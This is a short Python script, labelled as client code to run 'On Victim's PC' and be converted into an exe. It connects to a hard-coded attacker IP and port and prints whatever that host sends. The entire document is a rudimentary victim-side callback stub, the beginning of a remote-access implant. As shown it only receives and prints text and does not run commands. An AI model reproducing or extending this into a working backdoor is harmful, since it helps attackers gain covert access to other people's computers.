# Client Code: (On Victim's PC). Convert in exe (new)

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
IP_ATTACKER = '192.168.0.199'
PORT = 1234
s.connect((IP_ATTACKER, PORT))

full_msg = ''

while True:
    msg = s.recv(8)
    if len(msg) <= 0:
        break
    full_msg += msg.decode("utf-8")
print(full_msg)